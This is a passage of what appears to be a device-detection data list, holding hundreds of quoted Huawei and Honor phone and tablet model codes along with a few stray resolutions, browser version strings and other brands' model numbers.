'PE-UL00', 'PE-TL20', 'PE-UL00', 'PE-TL10', 'PE-UL00', 'PE-TL10', 'GIA-AN00', 'DLI-TL20', 'DLI-L22', 'DLI-L42', 'DIG-L21HN', 'JMM-L22', 'BLN-L21', 'BLN-L22', 'BLN-AL10', 'BLN-AL10', 'BLN-AL30', 'PLK-AL10', 'PLK-UL00', 'PLK-L01', 'PLK-AL10', 'PLK-TL01H', 'PLK-UL00', 'NEM-L21', 'FNE-AN00', 'FNE-AN00', 'FNE-NX9', 'AUM-AL20', 'AUM-L33', 'AUM-AL00', 'AUM-TL20', 'AUM-AL20', 'AUM-L29', 'AUM-L41', 'LND-AL30', 'LND-L29', '720x1358', 'ATH-AL00', 'ATH-CL00', 'ATH-TL00H)', 'ATH-UL00)', 'ATH-AL00', 'ATH-AL00', 'ATH-AL00', 'ATH-TL00H', 'DUA-L22', 'DUA-LX3', 'BND-AL10', 'BND-L21', 'FRD-L09', 'FRD-AL00', 'FRD-L19', 'PRA-AL00X', 'PRA-TL10', 'DUK-L09', 'VEN-L22', 'JAT-L29', 'JAT-LX3', 'JAT-LX1', 'JAT-L41', 'BKK-AL10', 'BKK-LX2', 'BKK-L21', 'BKK-LX2', 'KSA-LX9', 'KSA-LX9', 'JSN-L21', 'JSN-L22', 'JSN-AL00a', 'JSN-L23', 'ARE-AL00', 'ARE-L22HN', 'STF-L09', 'STF-L09S', 'STF-AL10', 'STF-AL10', 'STF-AL00', 'LLD-L31', 'LLD-AL10', 'MOA-LX9N', 'U', '720x1470', 'AKA-L29', 'LLD-AL20', 'LLD-AL30', 'LLD-AL20', 'LLD-AL20', 'DUA-LX9', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00a', 'HLK-AL00', 'HLK-L42', 'HLK-AL10', 'HLK-L41', 'HLK-AL10', 'HLK-AL10', 'CAM-UL00', 'CAM-UL00', 'NTS-AL00', 'NTS-AL00', 'NTS-AL00', 'TNY-AL00', 'TNY-TL00', 'TNY-AL00', 'TNY-AL00', 'ELZ-AN10', 'ELZ-AN20', 'ANY-LX1', 'LGE-NX9', 'LGE-AN10', 'LGE-AN20', 'MGI-AN00', 'PGT-N19', 'RVL-AL09', 'RVL-AL09', 'RVL-AL09', 'EDI-AL10', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'ANA-AL00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-NX9', 'JDN-W09', 'JDN-AL00', 'JDN-W09', 'AGR-W09HN', 'COR-L29', 'COR-AL10', 'KOZ-AL00', 'KOZ-AL00', 'KOZ-AL00', 'HJC-LX9', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'KSA-AL10', 'huawei ksa-al10', 'TNNH-AN00', 'TNNH-AN00', 'TNNH-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'CHM-TL00', 'CHM-UL00', 'HW-CHM-CL00', 'CHM-UL00', 'CHM-TL00H', 'CHM-UL00', 'CHM-TL00H', 'CHM-TL00', 'CHM-UL00', 'AKA-AL10', 'HJC-AN90', 'NEW-AN90', 'KOZ-AL40', 'KOZ-AL40', 'DUA-AL00', 'DUA-TL00', 'JAT-AL00', 'MOA-AL00', 'MOA-AL00', 'JDN2-AL00HN', 'JDN2-W09HN', 'AGS2-AL00HN', 'BKL-L09', 'BKL-AL20', 'BKL-AL00', 'PCT-TL10', 'PCT-AL10', 'PCT-AL10', 'ALA-AN70', 'KNT-AL10', 'KNT-AL20', 'KNT-AL20', 'KNT-UL10', 'KNT-TL10', 'DUK-AL20', 'DUK-AL20', 'DUK-AL20', 'JMM-AL00', 'JMM-AL10', 'JMM-TL10', 'JMM-AL00', 'BKL-L04', 'PCT-L29', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN10', 'OXF-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00', 'TEL-AN00a', 'TEL-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-TN00', 'TEL-AN10', 'Honor X10 Lite', 'DNN-LX9', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'Honor X10 Max', 'Honor X10 Pro', 'KKG-AN70', 'TFY-AN00', 'ADT-AN00', 'ADT-AN00', 'DIO-AN00', 'VNA-LX2', 'VNE-LX2', 'VNE-LX1', 'VNE-LX3', 'CMA-LX1', 'CMA-LX2', 'RKY-LX1', 'RKY-LX2', 'RKY-LX3', 'TFY-LX2', 'TFY-LX1', 'TFY-LX3', 'VNE-N41', 'CRT-LX1', 'CRT-LX3', 'CRT-LX2', 'ANY-LX2', 'ANY-LX3', 'ANY-NX1', 'RMO-NX1', 'RMO-NX1', 'HUAWEI SCL-L01', 'HUAWEI SCL-L21', 'HUAWEI LYO-L21', 'LYO-L21', 'Y538', 'Y538', 'Ideos', 'Ideos', 'IDEOS S7', 'IDEOS S7 Slim', 'IDEOS S7 Slim', 'Huawei Ideos X1', 'IDEOS X1', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8510', 'rv:35.0', 'rv:13.0', 'U8510', 'Huawei U8510', 'Huawei IDEOS X3', 'Huawei U8510 X3', 'HUAWEI U8510', 'u8800', 'U8800', 'U8800', 'U8800', 'Huawei Ideos X5', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'Huawei IDEOS X8', 'JNY', 'HUAWEI_M2', 'HUAWEI-M391', 'M650', 'M650', 'M650', 'M660', 'M660', 'M660', 'M660', 'Android 2.3.6', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'Android 2.2.2', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'Huawei M865', 'USCCADR3305', 'USCCADR3305', 'M865', 'USCCADR3305', 'M865', 'M865', 'M865', 'M865', 'Android 2.3.6', 'M865C', 'M865C', 'M865C', 'M865C', 'USCCADR3310', 'USCCADR3310', 'USCCADR3310', 'M866', 'HUAWEI M866', 'USCCADR3310', 'M866', 'HUAWEI M866', 'M866', 'USCCADR3310', 'HUAWEI M868', 'HUAWEI M881', 'HUAWEI M881', 'M886', 'M886', 'M886', 'M886', 'M886', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M921', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI MLA-AL10', 'HUAWEI MLA-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'ALP-AL00', 'ALP-L29', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'RNE-L21', 'RNE-L01', 'RNE-L23', 'BLA-L29', 'BLA-L09', 'BLA-A09', 'BLA-AL00', 'HMA-L29', 'HMA-L09', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-L29', 'SNE-LX1', 'SNE-LX3', 'LYA-L29', 'LYA-L09', 'LYA-AL00', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'EVR-AN00', 'EVR-AL00', 'EVR-AN00', 'EVR-L29', 'EVR-AL00', 'EVR-AL00', 'EVR-N29', 'TAS-AL00', 'TAS-AL00', 'TAS-L29', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'LIO-L29', 'LIO-AN00', 'LIO-L29', 'LIO-AN00', 'LIO-AL00', 'LIO-AN00', 'LIO-AN00', 'LIO-AL00', 'LIO-N29', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'Mate30 RS', 'LIO-AN00P', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'NOH-AL10', 'NOH-NX9', 'NOH-AN00', 'NOH-AN00', 'NOH-AL10', 'NOH-AN01', 'NOH-AN00', 'NOH-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'Mate 40 RS', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'CET-AL00', 'CET-LX9', 'CET-AL00', 'HUAWEI Mate 50', 'CET-AL00', 'DCO-AL00', 'CET-AL60', 'CET-AL60', 'HUAWEI MATE 7', 'HUAWEI NXT-AL10', 'HUAWEI NXT-L29', 'MHA-L29', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-L09', 'BLL-L23', 'LON-L29', 'LON-AL00', 'LON-AL00-PD', 'LON-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-L29', 'HUAWEI CRR-UL00', 'HUAWEI CRR-L09', 'HUAWEI CRR-UL20', 'HUAWEI CRR-CL00', 'BND-L34', 'TAH-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN10', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'PAL-LX9', 'PAL-AL00', 'PAL-AL00', 'PAL-AL00', 'HUAWEI Mate30', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'MON-AL19', 'MON-W19', 'GOT-AL09', 'GOT-AL09', 'GOT-AL09', 'GOT-W29', 'GOT-W29', 'AGS3-L09', 'HUAWEI MediaPad', 'HUAWEI MediaPad', '403HW', 'HUAWEI MediaPad', 'S8-306L', 'HUAWEI MediaPad', 'Huawei MediaPad', 'X1 7.0', 'Huawei MediaPad', 'S8-701w', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MON-AL19B', 'MON-AL19B', 'MON-AL19B', 'BTV-DL09', 'BTV-W09', 'BAH-W09', 'CPN-L09', 'CPN-AL00', 'CPN-W09', 'BAH-L09', 'BAH2-W19', 'JDN2-L09', 'BAH2-L09', 'BAH2-AL10', 'AGR-L09', 'KOB2-L03', 'T1-A21w', 'T1-A21L', 'T1-A23L', 'T1-701u', 'T1-701u', 'T1-823L', 'T1-823L', 'T1-821w', 'MediaPad T1 8.0', 'AGS-W09', 'AGS-L09', 'AGS-L03', 'BG2-U01', 'BG2-W09', 'KOB-L09', 'BZK-L00', 'KOB-W09', 'AGS2-L09', 'AGS2-W09', 'GEM-701L', 'GEM-703L', 'GEM-702L', 'Nexus 6P', 'Nexus 6P', 'HUAWEI CAN-L11', 'HUAWEI CAN-L12', 'HUAWEI CAN-L01', 'HUAWEI CAZ-AL10', '1080x1788', 'NCO-LX1', 'NCO-AL00', 'GLA-LX1', 'GLA-AL00', 'PIC-TL00', 'PIC-LX9', 'PIC-AL00', '704HW', 'BAC-L03', 'BAC-TL00', 'BAC-L01', 'BAC-TL00', 'BAC-AL00', 'BAC-L22', 'BAC-L21', 'BAC-AL00', 'BAC-L21', 'RNE-L22', 'HWI-AL00', 'HWI-AL00', 'HWI-AL00', 'HWI-TL00', 'HWI-AL00', 'PAR-LX1', 'PAR-AL00', 'PAR-LX9', 'PAR-AL00', 'ANE-AL00', 'INE-LX2', 'INE-LX2r', 'VCE-L22', 'VCE-TL00', 'VCE-AL00', 'VCE-AL00', 'VCE-AL00', 'MAR-AL00', 'MAR-AL00', 'MAR-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'GLK-AL00', 'GLK-TL00', 'GLK-TL00', 'GLK-LX1U', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'SPN-TL00', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JEF-TN00', 'JEF-NX9', 'JEF-AN20', 'JEF-AN00', 'JEF-AN20', 'JEF-AN00', 'JER-AN20', 'JER-AN10', 'JER-TN10', 'JER-AN10', 'JER-AN10', 'JER-AN20', 'JER-AN10', 'CDL-AN50', 'CDY-NX9B', 'CDY-AN00', 'CDY-AN00', 'JNY-LX2', 'ANG-LX2', 'ANG-LX1', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'CHL-AL60', 'CHL-AL60', 'NEN-LX1', 'NEN-L22', 'NAM-LX9', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'JLN-LX1', 'JLN-LX3', '608HW', 'PRA-LX2', 'PRA-LX3', 'HUAWEI MLA-L11', 'DIG-L01', 'WAS-AL00', 'FIG-LX1', 'FIG-LX2', 'FIG-LX3', 'POT-LX1', 'POT-LX3', 'POT-LX2J', 'POT-LX1AF', 'POT-LX1T', 'PPA-LX2', 'PPA-LX1', 'P Smart S', 'STK-LX1', 'MZ-STK-LX1', 'VTR-L09', 'VTR-L29', 'VTR-AL00', 'WAS-LX1A', 'WAS-TL10', 'VKY-AL00', 'VKY-L09', 'VKY-L29', 'BAC-L23', 'HUAWEI P11', 'EML-L09', 'EML-L29', 'EML-AL00', 'EML-AL00', 'EML-L29', 'ANE-LX1', 'ANE-LX2', 'ANE-LX3', 'ANE-LX2J', 'CLT-L29', 'CLT-AL00', 'CLT-L09', 'CLT-L04', 'CLT-AL00', 'ELE-AL00', 'ELE-L09', 'ELE-AL00', 'ELE-L29', 'ELE-L04', 'ELE-AL00', 'MAR-LX1A', 'MAR-LX1M', 'MAR-LX1A', 'MAR-LX2', 'MAR-LX3A', 'MAR-LX1B', 'VOG-AL10', 'VOG-L29', 'VOG-L09', 'HUAWEI P30PRO', 'ANA-LX4', 'JNY-LX1', 'ART-L29', 'ART-L29N', 'ELS-NX9', 'ELS-AN00', 'ELS-AN00', 'ELS-AN00', 'ELS-AN10', 'ELS-AN10', 'ELS-N39', 'ELS-AN10', 'ABR-LX9', 'ABR-AL00', 'Huawei P50', 'ABR-AL00', 'BAL-L49', 'BAL-AL00', 'JAD-AL50', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL60', 'ABR-AL60', 'HUAWEI P6-U06', 'HUAWEI P6s', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI GRA-L09', 'HUAWEI GRA-UL00', 'ALE-L21', 'ALE-L23', 'ALE-L21', 'ALE-L21', 'PRA-LX1', 'PRA-LA1', 'HUAWEI P8max', 'HUAWEI GRA-UL10', 'HUAWEI-P8Lite', 'HUAWEI-P8Lite', 'EVA-L09', 'EVA-DL00', 'EVA-L19', 'EVA-AL00', 'EVA-AL10', 'HUAWEI VNS-L31', 'HUAWEI VNS-L21', 'HUAWEI VNS-L22', 'SLA-L22', 'SLA-L02', 'HUAWEI VNS-L52', 'HUAWEI VNS-L52', 'DIG-L03', 'DIG-L23', 'VIE-L29', 'VIE-L09', 'VIE-AL10', 'VIE-AL10', 'SM-A336B', 'SM-A536E', 'M2101K6R', 'SM-A307G', 'SM-A528B', 'LM-K200', '2201116SG', 'SM-A107M', 'CPH2239', 'SM-A205G', 'M2004J19C', 'M2102J20SG', 'SM-A336M', 'SM-A127M', 'SM-G975U', 'SM-A730F', 'SM-G950F', 'M2007J20CG', 'T671E', 'HUAWEI_Q201', 'Huawei S7', 'HUAWEI-S7', 'HUAWEI-S7', 'HUAWEI-S7', 'S8600', 'S8600', 'S8600', 'HUAWEI S9', 'HUAWEI ATH-UL01', 'HUAWEI ATH-UL06', 'KANT-360', 'KANT-360S', 'LEO-BX9', 'LEO-DLXXE', 'HUAWEI T1 7.0', 'B988', 'ZT-10013G', 'B988', 'B988', 'HUAWEI T8100', 'HUAWEI T8500', 'HUAWEI T8600', 'T8620', 'T8620', 'T8620', 'T8830Pro', 'T8830Pro', 'T8830Pro', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI_T8951', 'HUAWEI_T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'T9200', 'T9200', 'T9200', 'HUAWEI-U20', 'HUAWEI U8120', 'U8180', 'U8180', 'U8180', 'MegaFon U8180', 'Kyivstar Terra', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8230', 'U8220/U8230', 'HuaweiU8300', 'U8350', 'U8350', 'GM FOX', 'U8350', 'Barcelona', 'U8350', 'U8350', 'U8350', 'U8350', 'U8350-51', 'U8350', 'U8350', 'U8350', 'U8350-51', 'Personal U8350', 'U8350', 'U8350', 'U8350', 'U8350', 'MF8503', 'ICE', 'MF8503', 'MF8503', 'HuaweiU8500', 'HuaweiU8510', 'S41HW', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'Huawei u8650', 'Huawei u8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650-1', 'U8650-1', 'U8650', 'MTC 955', 'U8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'Prism', 'Prism', 'Prism', 'U8651T', 'Prism', 'U8651T', 'U8651T', 'Prism', 'U8652', 'Huawei-U8652', 'U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Android 2.3.5', 'U8655-51', 'U8655-1', 'U8655-1', 'U8655-1', 'MTC 965', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'Etisalat', 'U8655-1', 'U8655-1', 'U8655-51', 'U8655-1', 'U8660', 'SONIC', 'HUAWEI U8661', 'HUAWEI_U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'GT-19100', 'U8666-1', 'U8666-1', 'U8666-1', 'MTC Fit', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-51', 'U8666-1', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'T-MobilemyTouch', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'Prism II', 'Prism II', 'Prism II', 'Prism II', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Ucell', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8815-51', 'U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'Galaxy S5', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'MTC Viva', 'HUAWEI U8816', 'U8816', 'MTC Viva', 'U8816', 'U8816', 'U8820', 'U8820', 'U8820', 'U8820', 'U8820', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'U8832D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'HUAWEI-U8850', 'U8860-51', 'HUAWEI_U8860', 'U8867Z', 'U8867Z', 'U8867Z', 'Huawei U8900', 'HUAWEI U8950', 'HUAWEI U8950D', 'Oppo F9D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8951', 'Huawei-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', '201HW', '201HW', '201HW', '201HW', 'U9500E', 'HW-01E', 'HW-01E', 'HW-01E', 'HW-01E', 'HUAWEI U9510', 'Huawei/U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI_U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'UM840', 'UM840', 'UM840', 'KANT-359', 'KANT-369', 'HUAWEI WATCH', 'ARS-L22', 'ARS-TL00', 'ARS-AL00', 'ARS-L22', 'Huawei Y221', 'Huawei y221', 'Huawei Y3 2017', 'CRO-U00', 'CRO-L22', 'CAG-L02', 'CAG-L22', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI_Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A2', 'Huawei Y301A2', 'Huawei Y301A2', 'HuaweiY301A2', 'Huawei Y320', 'Huawei Y320', 'Huawei Y320', 'Huawei Y330', 'Huawei Y330', 'HUAWEI Y330-U01', 'HUAWEI Y336-U02', 'Huawei Y360', 'HUAWEI Y360', 'HUAWEI LUA-L21', 'HUAWEI LUA-U22', 'MYA-L22', 'MYA-L23', 'MYA-U29', 'DRA-L21', 'DRA-LX3', 'DRA-L01', 'U', 'AMN-LX9', 'AMN-LX2', 'AMN-LX3', 'HUAWEI AMN-LX9', 'AMN-LX1', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'CRO-L23', 'CRO-L03', 'CRO-L03', 'CAG-L03', 'CAG-L23', 'DRA-LX2', 'MYA-L13', 'HUAWEI Y511', 'Huawei Y520', 'HUAWEI Y520', 'HUAWEI Y536A1', 'HUAWEI Y550', 'HUAWEIY560', 'Huawei Y5C', 'HUAWEI CUN-L22', 'HUAWEI CUN-U29', 'HUAWEI CUN-L21', 'HUAWEI CUN-L01', 'DRA-LX9', 'DRA-LX9', 'DRA-LX9', 'HUAWEI SCL-U31', 'HUAWEI SCC-U21', 'MYA-L11', 'MYA-L41', 'ATU-L22', 'ATU-L21', 'MRD-LX3', 'MRD-LX1', 'MRD-LX1F', 'MRD-LX1N', 'MRD-LX3', 'ATU-L31', 'TIT-L01', 'HUAWEI TIT-L01', 'HUAWEI TIT-AL00', 'MRD-LX2', 'Kavak Y625-U03', 'Y635-L03', 'Y635-L01', 'HUAWEI Y635-L03', 'Y635-L02', 'Y635-L21', 'Y635-L21', 'CAM-L21', 'HUAWEI CAM-L21', 'CAM-L23', 'CAM-L03', 'MED-LX9', 'MED-LX9N', 'H1711z', 'TRT-LX3', 'TRT-LX1', 'LDN-L01', 'LDN-LX3', 'LDN-L01', 'DUB-LX3', 'DUB-LX1', 'LDN-L21', 'LDN-L21', 'LDN-L21', 'TRT-L21A', 'LDN-LX2', 'DUB-LX2', 'DUB-AL20', 'PPA-LX3', 'Peppa-L23B', 'ART-L28', 'AQM-LX1', 'AQM-LX1', 'FLA-LX3', 'FLA-LX2', 'FLA-LX1', 'FLA-AL20', 'FLA-TL10', 'JKM-LX1', 'JKM-LX2', 'JKM-AL00b', 'JKM-AL00a', 'JKM-LX3', 'STK-L21', 